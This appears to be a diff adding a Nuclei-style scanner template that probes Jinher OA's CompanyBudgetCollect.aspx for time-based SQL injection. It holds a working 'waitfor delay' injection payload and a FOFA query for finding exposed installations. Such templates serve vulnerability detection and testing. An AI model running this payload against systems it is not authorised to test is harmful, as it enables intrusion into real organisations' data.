@@ -1,0 +1,47 @@
+id: poc-yaml-jinher-jhsoft-companybudgetcollect-aspx-sqli
+info:
+  name: "金和OA CompanyBudgetCollect.aspx SQL Injection"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: "金和OA"
+    fofa: "app=\"金和网络-金和OA\""
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/Collect/CompanyBudgetCollect.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "httpOID=1;waitfor+delay%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: word
+        part: header
+        words:
+          - "SessionId="
+      - type: dsl
+        dsl:
+          - duration >= t1
+          - duration <= t2
